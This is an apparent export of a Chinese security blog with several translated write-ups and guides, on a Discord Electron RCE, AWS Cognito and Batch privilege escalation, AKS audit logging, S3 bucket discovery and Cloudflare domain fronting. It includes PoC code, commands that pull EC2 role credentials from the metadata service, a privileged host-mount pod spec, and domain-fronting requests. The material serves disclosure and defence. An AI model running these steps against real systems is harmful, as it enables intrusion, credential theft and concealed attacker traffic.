ftp://localhost:9999 修复建议\r对于使用CR/LF作为分隔符的协议（如FTP、POP3等），在构造命令时不应允许用户名或密码中包含CR或LF字符。\n影响评估\r可实现FTP/POP3命令注入。项目方最终认定该问题属于\u0026quot;本地攻击者已存在\u0026quot;类别，不构成安全漏洞。\n时间线\r2024年11月9日：漏洞报告提交 2024年11月10日：curl团队确认问题性质 2024年11月10日：报告关闭（标记为Not Applicable） 2025年7月7日：报告公开披露 ","date":"2025-08-03T04:08:44+08:00","permalink":"http://localhost:1313/p/curl-netrc%E6%96%87%E4%BB%B6crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"curl netrc文件CRLF注入漏洞分析"},{"content":"API安全测试清单：7个关键步骤\rAPI是恶意攻击者的常见攻击载体。使用我们的API安全测试清单和最佳实践来保护您的组织及其数据。\n作者：Dave Shackleford（Voodoo Security）、Michael Cobb\n发布日期：2024年11月1日\nAPI使应用程序能够交换和消费数据及服务。由于其能够访问组织的敏感数据，API成为恶意黑客和威胁行为者的诱人目标。组织必须保护其API，以保护企业资源以及使用API的其他应用程序和组织。\n团队应进行API安全测试，以确保API在负载下保持可用。测试还必须确定API暴露的数据和资源的机密性、完整性和可用性。API安全测试应全面且持续，以便解决漏洞发现和修复问题，并增强对攻击者的抵御能力。测试应证明安全控制的有效性，并在必要时提供需要修复的领域的见解。组织应将API测试与OpenAPI规范对齐，以确保其完整和彻底。\nAPI安全测试清单\r以下最佳实践可帮助确保API安全测试计划足够彻底，以有效防范API安全风险。\n1. 确定谁对测试和维护API安全负总责\r许多团队参与API生命周期，项目在进展过程中会经历大量快速变化和迭代。重要的是指定一个人记录所有API，确保所有测试完成并采取行动。\n随着对云服务和Web应用程序环境的日益重视，与过去相比，可能有更多的业务部门和其他应用程序所有者参与API安全治理。这使得有一个中央联系点变得更加重要。\n2. 为安全测试预算时间和资源\r安全测试需要时间和金钱，因此组织在启动新项目时需要考虑这些因素。威胁建模突出了需要缓解的潜在API风险和常见漏洞，但请注意，项目上线后维护和更新API测试的预算也是必要的。\n请注意，由第三方提供商开发和维护的任何API可能随时更改。安全和应用程序团队应确保在规划和项目周期中考虑动态API测试。\n3. 注册、分类并记录每个API的用途及其功能\r记录API及其用途。这些信息有助于测试评估API是否可以处理可接受的操作和有效数据，以及不可接受的操作或无效数据。诸如OpenAPI规范、AsyncAPI和GraphQL Introspection等标准使人类和机器能够发现和理解API的响应和能力。许多API工具使用这些规范来加速API的开发生命周期。\n4. 尽早运行测试并尽可能自动化\r如果在开发生命周期的早期发现安全问题，每个人都可以节省时间和金钱。有许多API安全工具可用，无论是开源还是许可的，都可以集成到现有的工作流程和持续集成/持续交付管道中。具有模拟服务的工具消除了构建生产系统全规模复制的需要。\n此外，确定谁将执行测试——开发人员、安全团队或外部渗透测试人员（如果内部缺乏技能）——以及何时运行测试。理想情况下，应在应用程序的每个构建上运行测试。许多API测试工具现在可以完全集成，以便按需进行持续或触发的测试。\n5. 定义要运行的测试类型\r对API安全评估进行以下测试：\n无效输入：API的输入应被视为来自不受信任的源，并相应地进行清理和验证。模糊测试可用于向API发送随机数据，以查看其是否可以在不崩溃的情况下处理意外数据。 注入攻击：使用这些测试攻击来确保API拒绝尝试操纵后端数据库或在服务器上执行OS命令的请求，而不暴露任何敏感信息。 参数篡改：通过API请求发送的参数（如购物车中商品的价格）容易被攻击者更改。参数篡改检查API在处理参数之前是否验证和检查参数。 未处理的HTTP方法：使用所有八种HTTP方法发送请求，以确保不必要的 ","date":"2025-08-03T03:42:17+08:00","permalink":"http://localhost:1313/p/api%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%B8%85%E5%8D%957%E4%B8%AA%E5%85%B3%E9%94%AE%E6%AD%A5%E9%AA%A4/","title":"API安全测试清单：7个关键步骤"},{"content":"Discord桌面应用RCE漏洞分析\r几个月前，我在Discord桌面应用中发现了一个远程代码执行漏洞，并通过其漏洞赏金计划进行了报告。这个RCE漏洞的有趣之处在于它需要组合多个漏洞才能实现。本文将分享详细的技术细节。\n选择Discord作为目标的原因\r我当时想研究Electron应用的安全漏洞，于是寻找提供Electron应用漏洞赏金的项目，最终选择了Discord。同时，作为Discord用户，我也想确认自己使用的应用是否安全。\n发现的漏洞\r我主要发现了以下三个漏洞，通过组合它们实现了RCE：\n缺失contextIsolation iframe嵌入中的XSS 导航限制绕过(CVE-2020-15174) 缺失contextIsolation\r在测试Electron应用时，我首先检查了用于创建浏览器窗口的BrowserWindow API选项。通过分析这些选项，可以评估在渲染器中执行任意JavaScript时实现RCE的可能性。\nDiscord的Electron应用虽然不是开源项目，但其JavaScript代码以asar格式保存在本地，解压后即可阅读。\n主窗口使用了以下选项：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 const mainWindowOptions = { title: \u0026#39;Discord\u0026#39;, backgroundColor: getBackgroundColor(), width: DEFAULT_WIDTH, height: DEFAULT_HEIGHT, minWidth: MIN_WIDTH, minHeight: MIN_HEIGHT, transparent: false, frame: false, resizable: true, show: isVisible, webPreferences: { blinkFeatures: \u0026#39;EnumerateDevices,AudioOutputDevices\u0026#39;, nodeIntegration: false, preload: _path2.default.join(__dirname, \u0026#39;mainScreenPreload.js\u0026#39;), nativeWindowOpen: true, enableRemoteModule: false, spellcheck: true } }; 其中最重要的是nodeIntegration和contextIsolation选项。从代码中可以看出，nodeIntegration设为false，而contextIsolation保持默认值false。\n如果nodeIntegration设为true，网页JavaScript可以直接通过require()使用Node.js功能。例如在Windows上执行calc应用：\n1 2 3 \u0026lt;script\u0026gt; require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;calc\u0026#39;); \u0026lt;/script\u0026gt; 本次nodeIntegration设为false，因此无法直接通过require()使用Node.js功能。但通过禁用contextIsolation，网页JavaScript仍可能影响渲染器中Electron内部JavaScript代码的执行。\ncontextIsolation禁用时，网页JavaScript可以覆盖JavaScript内置方法（如Array.prototype.join），从而干扰外部网页的JavaScript代码执行。这种行为很危险，因为Electron允许外部JavaScript代码使用Node.js功能，无论nodeIntegration设置如何。\n这种技巧最初由Cure53在2016年的渗透测试中发现（我也参与了该测试），之后我们报告给Electron团队并引入了contextIsolation功能。\ncontextIsolation通过在网页和外部JavaScript代码之间引入隔离的上下文，防止互相影响。这是消除RCE可能性的必要功能，但在Discord中被禁用。\n利用preload脚本实现RCE\r在检查preload脚本时，我发现Discord通过DiscordNative.nativeModules.requireModule(\u0026lsquo;MODULE-NAME\u0026rsquo;)向网页暴露了允许调用的模块功能。\n虽然不能直接使用child_process等模块实现RCE，但通过覆盖JavaScript内置方法干扰暴露模块的执行，仍可实现RCE。\n以下是PoC代码。通过覆盖RegExp.prototype.test和Array.prototype.join，调用\u0026quot;discord_utils\u0026quot;模块中的getGPUDriverVersions函数可以弹出calc应用：\n1 2 3 4 5 6 7 RegExp.prototype.test=function(){ return false; } Array.prototype.join=function(){ return \u0026#34;calc\u0026#34;; } DiscordNative.nativeModules.requireModule(\u0026#39;discord_utils\u0026#39;).getGPUDriverVersions(); getGPUDriverVersions函数尝试使用\u0026quot;execa\u0026quot;库执行程序：\n1 2 3 4 5 6 7 8 9 10 11 12 13 module.exports.getGPUDriverVersions = async () =\u0026gt; { if (process.platform !== \u0026#39;win32\u0026#39;) { return {}; } const result = {}; const nvidiaSmiPath = `${process.env[\u0026#39;ProgramW6432\u0026#39;]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`; try { result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, [])); } catch (e) { result.nvidia = {error: e.toString()}; } return result; }; 通常execa会执行nvidiaSmiPath指定的\u0026quot;nvidia-smi.exe\u0026quot;，但由于覆盖了RegExp.prototype.test和Array.prototype.join，参数在执行过程中被替换为\u0026quot;calc\u0026quot;。\niframe嵌入中的XSS\r接下来需要找到在应用中执行JavaScript的方法。我检查了自动链接和Markdown功能，但没发现问题，于是转向iframe嵌入功能。当发布YouTube等URL时，Discord会获取OGP信息并显示页面标题、描述等内容。\nDiscord从OGP提取视频URL，只有允许域且符合嵌入页面格式的URL才会被iframe嵌入。\n通过检查CSP的frame-src指令，我发现sketchfab.com可以嵌入iframe，并在其3D模型页脚发现DOM型XSS。\n以下是PoC，发布此URL到聊天后，Sketchfab会嵌入iframe，点击几次后执行任意JavaScript：\n1 2 3 4 5 6 7 8 9 \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta property=\u0026#34;og:title\u0026#34; content=\u0026#34;RCE DEMO\u0026#34;\u0026gt; [...] \u0026lt;meta property=\u0026#34;og:video:url\u0026#34; content=\u0026#34;https://sketchfab.com/models/2b198209466d43328169d2d14a4392bb/embed\u0026#34;\u0026gt; \u0026lt;meta property=\u0026#34;og:video:type\u0026#34; content=\u0026#34;text/html\u0026#34;\u0026gt; \u0026lt;meta property=\u0026#34;og:video:width\u0026#34; content=\u0026#34;1280\u0026#34;\u0026gt; \u0026lt;meta property=\u0026#34;og:video:height\u0026#34; content=\u0026#34;720\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; 但JavaScript仅在iframe中执行，需要从iframe跳转到顶级浏览上下文才能实现RCE。\n导航限制绕过(CVE-2020-15174)\r主进程代码中使用\u0026quot;new-window\u0026quot;和\u0026quot;will-navigate\u0026quot;事件限制导航：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 mainWindow.webContents.on(\u0026#39;new-window\u0026#39;, (e, windowURL, frameName, disposition, options) =\u0026gt; { e.preventDefault(); if (frameName.startsWith(DISCORD_NAMESPACE) \u0026amp;\u0026amp; windowURL.startsWith(WEBAPP_ENDPOINT)) { popoutWindows.openOrFocusWindow(e, windowURL, frameName, options); } else { _electron.shell.openExternal(windowURL); } }); mainWindow.webContents.on(\u0026#39;will-navigate\u0026#39;, (evt, url) =\u0026gt; { if (!insideAuthFlow \u0026amp;\u0026amp; !url.startsWith(WEBAPP_ENDPOINT)) { evt.preventDefault(); } }); 测试发现，从iframe发起的顶级导航在某些情况下不会被阻止。进一步研究发现，当iframe与顶级窗口同源时会触发\u0026quot;will-navigate\u0026quot;事件，但跨源时不会触发。我认为这是Electron的bug并报告给了Electron团队。\n利用这个bug，可以通过iframe的XSS导航到包含RCE代码的页面，如top.location=\u0026quot;//l0.cm/discord_calc.html\u0026quot;。\n漏洞修复\r这些问题通过Discord的漏洞赏金计划报告后：\nDiscord首先禁用了Sketchfab嵌入 通过添加sandbox属性到iframe防止导航 最终启用了contextIsolation Sketchfab的XSS通过其漏洞赏金计划快速修复。\u0026ldquo;will-navigate\u0026quot;事件的问题被标记为CVE-2020-15174并修复。\n总结\r这个案例展示了如何组合外部页面漏洞和Electron本身的bug实现RCE。希望本文能帮助开发者更好地保护Electron应用安全。\n","date":"2025-08-03T03:25:44+08:00","permalink":"http://localhost:1313/p/discord%E6%A1%8C%E9%9D%A2%E5%BA%94%E7%94%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"Discord桌面应用远程代码执行漏洞分析"},{"content":"Blackhat 2016漏洞实验课程\r课前教程模块\r基础缓冲区溢出\n32位栈溢出原理与实践 通过恶意输入覆盖EIP寄存器 使用坏字符检测定位内存冲突 现代绕过技术\nDEP/NX保护机制的ROP链构造 绕过ASLR的内存地址泄露技术 使用JIT喷射对抗控制流保护 Crackme挑战集\rLevel1\n基础栈溢出（无保护机制）\n要求：通过覆盖返回地址执行shellcode\nLevel2\n带Canary保护的栈溢出\n要求：爆破/泄露栈金丝雀值\nLevel3\n完全防护环境（DEP+ASLR）\n要求：组合使用ROP与内存泄露技术\n实验环境要求：\nVMware Workstation 12+ Kali Linux虚拟机 预装GDB-Peda/Pwndbg调试器 Python Exploit开发套件 ","date":"2025-08-03T03:03:19+08:00","permalink":"http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4blackhat-2016%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C%E8%AF%BE%E7%A8%8B-%E8%AF%BE%E5%89%8D%E6%95%99%E7%A8%8B%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%8C%91%E6%88%98/","title":"漏洞利用实验室：Blackhat 2016漏洞实验课程 - 课前教程与破解挑战"},{"content":"本文指导您如何在Azure Kubernetes Service (AKS)虚拟机规模集(VMSS)上使用Linux审计子系统（也称为auditd）启用和配置Linux审计日志记录。\n警告\n以下信息截至本文发布日期（2023年3月）是准确的，未来指南可能会有所变化。\n与Kubernetes控制平面日志提供集群高级操作可见性不同，在集群上启用auditd日志记录可以让您查看AKS工作节点和容器内核级别的活动。这包括进程创建、文件访问和命令行活动等，对于发现集群上异常命令行活动和程序执行非常有价值。与容器级日志记录不同，这为您提供了底层工作节点上运行的负载的可见性，而不仅仅是运行在其上的容器化负载（包括容器逃逸和其他漏洞利用）。它具有高度可配置性，对于运行多租户集群尤其有价值。\n要了解Linux主机级审计日志记录（和Kubernetes控制平面日志记录）如何为集群提供有用的可见性，请查看我们在Azure Kubernetes Service (AKS)威胁搜寻博客文章和Jupyter笔记本中提供的威胁搜寻查询。\n主机级审计日志记录流程\r主机级审计日志记录利用多个Linux工具捕获审计日志并将其发送到Log Analytics工作区进行审查。\n实现此目标的组件包括：\nauditd：Linux审计系统的守护进程。守护进程写入磁盘的审计事件由auditd.rules中定义的规则配置。 audisp：审计事件多路复用器，可用于将auditd事件数据分发到syslog等数据收集服务器。 syslog：将日志转发到Linux的Log Analytics代理（OMS）。可以通过Azure门户或管理主机上的配置文件配置syslog转发的事件的设施和严重性。 auoms：Microsoft审计收集工具，可以使用auoms配置中定义的处理规则来收集和过滤auditd/audisp事件数据。 Log Analytics工作区：您可以使用Kusto查询语言（KQL）探索来自Azure资源和服务的遥测数据。 如何在AKS VMSS上启用auditd日志记录\r警告\n以下内容指导您完成在AKS集群上设置auditd日志记录的手动步骤。然而，这需要您在集群中的每个工作节点上安装auditd，并且在集群自动扩展后配置将被删除。为避免这种情况，我们建议您使用aks-auditd自动在集群上设置此日志记录，或使用自定义脚本扩展。aks-auditd还支持节点重新映像和自动扩展，而手动配置不支持。\n在AKS集群VMSS上启用Linux Operations Management Suite (OMS)代理（auoms），运行以下命令：\n1 2 3 4 5 6 7 az vmss extension set \\ --resource-group $RESOURCE_GROUP \\ --vmss-name $VMSS_NAME \\ --name OmsAgentForLinux \\ --publisher Microsoft.EnterpriseCloud.Monitoring \\ --protected-settings \u0026#39;{\\\u0026#34;workspaceKey\\\u0026#34;:\\\u0026#34;\u0026lt;KEY\u0026gt;\\\u0026#34;}\u0026#39; \\ --settings \u0026#39;{\\\u0026#34;workspaceId\\\u0026#34;:\\\u0026#34;\u0026lt;ID\u0026gt;\u0026#34;,\\\u0026#34;skipDockerProviderInstall\\\u0026#34;:true}\u0026#39; 您的集群的vmss-name将以aks-agentpool开头，并属于以MC_开头的管理资源组，如下面的截图所示。\nworkspaceId和workspaceKey可以在Log Analytics工作区内的“代理管理”选项卡中找到，如下面的截图所示。workspaceKey对应于下面突出显示的“主键”。\n通过Azure门户触发VM更新（选择每个实例并选择升级）。\n在VMSS工作节点上安装auditd。为此，您需要部署或获取一个在集群上运行的特权Pod，该Pod可以访问底层工作节点的文件系统和进程ID命名空间。您可以通过以下方式实现：\n部署一个Pod，其规范将hostPath卷挂载到容器环境中。 在Pod规范中包含securityContext字段并启用特权模式。 配置主机进程ID命名空间共享，通过在Pod规范中包含hostPID字段并启用它。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 apiVersion: v1 kind: Pod metadata: name: privileged-pod spec: hostPID: true containers: - name: priv-host-mount image: alpine:latest command: - /bin/sh - -c - - args: - while true; do sleep 30; done; securityContext: privileged: true volumeMounts: - name: privmount mountPath: /workernode volumes: - name: privmount hostPath: path: / type: Directory 使用kubectl exec获取到Pod上运行容器的交互式shell，使用chroot模拟对底层虚拟机的访问并安装auditd，如下所示。 1 2 3 kubectl exec -it $POD /bin/sh \u0026gt; chroot /workernode \u0026gt; apt-get update \u0026amp;\u0026amp; apt-get install auditd -y 配置auditd规则：\n添加一个规则来监控进程执行。您可以通过在以下路径创建一个名为10-procmon.rules的文件：/etc/audit/rules.d/10-procmon.rules，并添加以下内容来实现。更详细的配置信息可以在这里找到。 1 2 -a exit,always -F arch=b64 -S execve -k procmon -a exit,always -F arch=b32 -S execve -k procmon 通过运行systemctl restart auditd更新auditd守护进程。 更新syslog插件设施设置，以更新audisp将auditd记录定向到syslog。为此，您需要更新/etc/audisp/plugins.d/syslog.conf中的配置，并将active字段设置为yes，如下面的截图所示。\n默认情况下，syslog启用的设施是user设施。如果您想更改此设置，可以更改ARGS中的第二个参数（第一个参数是日志级别）。例如，以下配置将syslog设施更改为authpriv。\n1 2 3 4 5 6 active = yes direction = out path = builtin_syslog type = builtin args = LOG_INFO LOG_AUTHPRIV format = string 使用systemctl restart auditd重新启动auditd守护进程以应用更改。\n在门户中转到Log Analytics工作区，并配置日志代理以接受authpriv设施的INFO级别的syslog事件。为此：\n导航到“设置”\u0026gt;“代理配置” 选择“Syslog” 选择“+添加设施” 在下拉菜单中选择authpriv，如下所示。 ","date":"2025-08-03T02:52:29+08:00","permalink":"http://localhost:1313/p/%E4%B8%BAaks-vmss%E9%85%8D%E7%BD%AE%E4%B8%BB%E6%9C%BA%E7%BA%A7%E5%AE%A1%E8%AE%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/","title":"为AKS VMSS配置主机级审计日志记录"},{"content":"WEBCAST: Active Directory主动防御(ADAD)入门指南\rJohn Strand //\n本次网络研讨会中，John将讲解如何通过Active Defense Harbinger Distribution (ADHD)工具集配置Active Directory主动防御系统，并探讨《主动网络防御确定性法案》(ACDC)等法律框架。内容包括：\n创建蜜罐账户的操作演示 构建具有回调功能的Word文档 部署虚假SMB共享服务器 所有技术方案均免费提供。 研讨会幻灯片下载：点击获取\n进阶学习推荐\n想跟随John系统提升技能？推荐以下课程：\nSOC核心技能 主动防御与网络欺骗 BHIS与MITRE ATT\u0026amp;CK安全入门 渗透测试基础 支持直播/虚拟及点播形式学习 技术要点说明\n蜜罐账户：在AD中设置高权限诱饵账户，实时监控异常访问行为 文档回调：通过特制Word文档触发攻击者连接至监控系统 SMB欺骗：伪造共享服务器捕获凭证哈希与攻击路径信息 ","date":"2025-08-03T02:40:31+08:00","permalink":"http://localhost:1313/p/%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1active-directory%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E6%89%93%E9%80%A0%E8%9C%9C%E7%BD%90%E8%B4%A6%E6%88%B7%E4%B8%8E%E8%99%9A%E5%81%87smb%E5%85%B1%E4%BA%AB/","title":"主动防御Active Directory入门指南：打造蜜罐账户与虚假SMB共享"},{"content":"Bucket Finder\r该项目与我的博客文章《Whats In Amazon\u0026rsquo;s Buckets》相关联，更多后台原理请参考该博文。\n这是一个使用简单的工具，仅需提供字典文件即可自动检测每个单词是否对应亚马逊S3系统中的有效存储桶。对于发现的存储桶，工具会检测其权限状态（公开/私有/重定向）。\n公开存储桶会检查是否启用了目录索引，若启用则通过HEAD方法验证列出的所有文件访问权限 重定向链接会被追踪并检查最终目标地址 所有检测结果都会生成报告供后续分析 安装\r仅需内置模块支持，无需额外安装gem包。下载文件后赋予可执行权限即可运行。\n已通过Ruby 1.8.7和1.9.1版本测试，兼容性良好。\n使用方法\r基础用法（指定字典文件）：\n1 ./bucket_finder.rb my_words 支持通过--region参数指定初始检测区域：\n1 ./bucket_finder.rb --region ie my_words （默认使用US Standard区域，工具会自动处理所有重定向）\n启用--download选项可下载发现的公开文件（注意可能包含大文件）：\n1 ./bucket_finder.rb --download --region ie my_words 文件将按存储桶名称建立目录结构保存。\n新增--log-file参数支持日志记录：\n1 ./bucket_finder.rb --log-file bucket.out my_words 下载\r[Bucket Finder 1.0] [Bucket Finder 1.1] ","date":"2025-08-03T02:29:34+08:00","permalink":"http://localhost:1313/p/bucket-finder%E5%B7%A5%E5%85%B7%E6%8E%A2%E6%B5%8B%E4%BA%9A%E9%A9%AC%E9%80%8As3%E5%AD%98%E5%82%A8%E6%A1%B6%E7%9A%84%E5%AE%89%E5%85%A8%E5%88%A9%E5%99%A8/","title":"Bucket Finder工具：探测亚马逊S3存储桶的安全利器"},{"content":"2014年4月8日，安全研究人员披露了OpenSSL加密软件库中存在重大缺陷，该漏洞被命名为「Heartbleed」，可能允许攻击者利用通信加密密钥访问网站用户数据。\n经深入调查，微软确认以下服务不受此漏洞影响：\nMicrosoft账户 Microsoft Azure Office 365 Yammer Skype 技术细节补充：\n所有2014年4月14日前受支持的Windows版本均内置免疫机制 Windows系统默认使用Schannel组件实现SSL/TLS协议栈（而非OpenSSL），具体技术说明参见《Information about HeartBleed and IIS》 用户安全建议： 微软始终建议用户定期更新复杂密码，相关指南可参考安全中心的密码强度检查工具。\n2014年4月22日更新说明：\n补注1：涵盖当时所有受支持的Windows版本 补注2：微软产品默认采用Windows原生Schannel实现，与OpenSSL实现存在架构级差异 ","date":"2025-08-03T02:18:38+08:00","permalink":"http://localhost:1313/p/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1%E4%B8%8D%E5%8F%97opensslheartbleed%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D-msrc%E5%AE%98%E6%96%B9%E5%A3%B0%E6%98%8E/","title":"微软服务不受OpenSSL「Heartbleed」漏洞影响 | MSRC官方声明"},{"content":"PGP签名与Linux包管理的安全隐患\r在关于PGP生态系统的讨论中，我经常听到一种观点：尽管PGP存在问题，但它对Linux发行版的软件包签名至关重要。本文将重点讨论PGP在Linux包管理环境中暴露的几个系统性安全问题。\n示例分析：Ubuntu的HHVM安装流程\r以Ubuntu系统安装HHVM（Facebook开发的HACK语言运行时）的官方指导为例，其关键步骤包含从Ubuntu密钥服务器获取PGP签名密钥：\n1 apt-key adv --recv-keys --keyserver hkp://keyserver.ubuntu.com:80 0xB4112585D386EB94 攻击手段1：签名洪水攻击\rPGP密钥服务器采用\u0026quot;只追加\u0026quot;设计，任何人可向目标密钥添加大量签名。近期已有攻击者利用该特性，通过添加数万签名使密钥体积膨胀至MB级别，导致GnuPG导入过程极度缓慢甚至失败。理论上攻击者可制造GB级密钥彻底瘫痪安装流程。\n攻击手段2：密钥ID碰撞攻击\r安装脚本中使用的64位密钥ID（截取公钥SHA1哈希值）存在碰撞风险。研究者曾通过\u0026quot;Evil32\u0026quot;攻击演示了对PGP强集合密钥的ID碰撞，云GPU环境下实施64位ID碰撞的成本约为12万美元。中间人攻击者可拦截非加密的密钥服务器连接，注入碰撞密钥从而部署恶意软件包。\n攻击手段3：HTTP明文传输风险\r某些厂商（如Dropbox历史安装指南）通过HTTP分发仓库密钥和软件包，使网络攻击者可轻易替换密钥和软件包。值得注意的是，Debian/Ubuntu默认仍使用HTTP协议更新官方仓库。\n系统性缺陷与改进建议\r密钥服务器设计缺陷：追加式架构导致密钥洪水攻击无法根治 过时技术未淘汰：尽管32/64位密钥ID风险已知多年，社区仍未强制迁移 解决方案： 避免使用公共密钥服务器，改为HTTPS托管自有密钥 完全弃用短密钥ID标识 参考Debian Wiki的第三方仓库安全规范 ","date":"2025-08-03T02:07:44+08:00","permalink":"http://localhost:1313/p/pgp%E7%AD%BE%E5%90%8D%E4%B8%8Elinux%E5%8C%85%E7%AE%A1%E7%90%86%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E6%82%A3%E8%A7%A3%E6%9E%90/","title":"PGP签名与Linux包管理的安全隐患解析"},{"content":"从上一期说起\u0026hellip;您解决CloudSecTidbit第2期的IaC实验了吗？\r[解决方案] AWS Cognito挑战的核心是通过权限提升获取管理员权限并读取内部用户列表。应用程序使用AWS Cognito颁发的会话令牌（保存为名为aws-cognito-app-access-token的cookie），攻击者可以通过以下步骤实现提权：\n1 2 aws cognito-idp get-user --region us-east-1 --access-token \u0026lt;USER_ACCESS_TOKEN\u0026gt; aws --region us-east-1 cognito-idp update-user-attributes --user-attributes \u0026#34;Name=custom:Role,Value=admin\u0026#34; --access-token \u0026lt;USER_ACCESS_TOKEN\u0026gt; 漏洞根源在于平台过度信任custom:Role属性进行授权判断。\n技术聚焦：AWS Batch权限提升研究\rAWS Batch基础架构\rAWS Batch是AWS提供的批处理计算服务，主要组件包括：\nJobs：工作单元（脚本/可执行文件/容器镜像） Job definitions：任务蓝图（含IAM角色、资源需求等配置） Job Queues：任务调度队列 Compute environments：计算资源环境（支持Fargate/EC2/EKS三种编排类型） 漏洞场景分析\r在多租户平台中发现高危配置：\n所有租户任务均使用EC2编排类型运行 计算环境EC2实例需要高权限角色管理EFS等资源 任务容器具有batch:RegisterJobDefinition和batch:SubmitJob权限 攻击链分解\r初始访问：通过容器元数据服务（CMDS@169.254.170.2）获取任务执行角色凭证 权限滥用：利用获得的凭证创建恶意任务定义 网络配置突破：由于EC2环境默认使用主机网络模式，容器可访问实例元数据服务（IMDSv2） 凭证窃取：通过IMDS获取EC2实例的高权限角色凭证 技术验证过程\r步骤1 - 获取实例角色名：\n1 2 3 4 5 6 7 aws batch register-job-definition \\ --job-definition-name poc-get-rolename \\ --type container \\ --container-properties \u0026#39;{ \u0026#34;image\u0026#34;: \u0026#34;curlimages/curl\u0026#34;, \u0026#34;command\u0026#34;: [\u0026#34;sh\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600`; curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/\u0026#34;] }\u0026#39; 步骤2 - 获取角色凭证：\n1 2 3 4 5 6 7 aws batch register-job-definition \\ --job-definition-name poc-get-aimcreds \\ --type container \\ --container-properties \u0026#39;{ \u0026#34;image\u0026#34;: \u0026#34;curlimages/curl\u0026#34;, \u0026#34;command\u0026#34;: [\u0026#34;sh\u0026#34;,\u0026#34;-c\u0026#34;,\u0026#34;TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600`; curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\u0026#34;] }\u0026#39; 安全建议\r审计人员检查清单：\n确认任务执行上下文是否限制IMDS访问 审查EC2编排环境中的实例角色权限 检查是否过度分配RegisterJobDefinition/SubmitJob权限 开发者防护措施：\n网络层限制IMDS访问（通过aws ec2 modify-instance-metadata-options） 遵循最小权限原则配置任务角色 考虑使用Fargate替代EC2编排类型 实践资源\r漏洞复现环境已开源：CloudSecTidbits实验室\n延伸阅读\rAWS Batch官方文档 容器工作负载中的元数据服务安全 ","date":"2025-08-03T01:56:38+08:00","permalink":"http://localhost:1313/p/%E6%8E%A2%E7%B4%A2aws-batch%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"探索AWS Batch权限提升漏洞的技术分析"},{"content":"通过Cloudflare实现域名伪装\r在开始本文之前，我认为有必要先讨论\u0026quot;域名伪装\u0026quot;(Domain Fronting)这个术语及其可能的定义。如果您只关心如何隐藏通信内容，可以直接跳过本节。\n定义\u0026quot;域名伪装\u0026quot;\r从红队视角来看，域名伪装意味着将一个恶意网站的请求隐藏在看似访问无害网站的请求中。从技术角度，这可以描述为将网络层设置与特定虚拟主机的应用层请求解耦。如果观察者只能看到网络层指向\u0026quot;好\u0026quot;域名(或未被标记为恶意的域名)，那么攻击就成功了。\n实际技术内容\r当我发布关于域名伪装的基础文章时，@sehnaoui在推特上分享了链接，并收到Cloudflare解决方案工程团队负责人Suzanne的回复：\n首先，我并未声称该技术在Cloudflare上有效，文中对Cloudflare的唯一提及是将其作为CDN的示例。\n以下是使用文章中讨论的技术在Cloudflare上实现域名伪装的演示：\n1 2 $ curl -s -H $\u0026#39;Host: frontmecf.vuln-demo.com\u0026#39; http://digininja.org.uk \u0026lt;p\u0026gt;Vuln Demo site fronted by Cloudflare\u0026lt;/p\u0026gt; 设置过程相当简单：我注册了Cloudflare账户，添加了digininja.org.uk域名并完成设置流程(包括将域名的NS记录转移到Cloudflare)。同时添加了vuln-demo.com账户但未完成设置，该域名保持\u0026quot;Pending Nameserver Update\u0026quot;状态。\n为了证明这不是因为两个域名在同一账户下，我们尝试另一个由Cloudflare托管的知名域名：\n1 2 $ curl -s -H $\u0026#39;Host: frontmecf.vuln-demo.com\u0026#39; http://cloudflare.com \u0026lt;p\u0026gt;Vuln Demo site fronted by Cloudflare\u0026lt;/p\u0026gt; 是的，我确实通过Cloudflare实现了域名伪装！\nHTTPS场景下的挑战\r当我尝试在HTTPS上实现相同效果时，遇到了问题：\n1 2 3 4 5 6 7 8 $ curl -s -H $\u0026#39;Host: frontmecf.vuln-demo.com\u0026#39; https://cloudflare.com \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;403 Forbidden\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body bgcolor=\u0026#34;white\u0026#34;\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;403 Forbidden\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;cloudflare\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 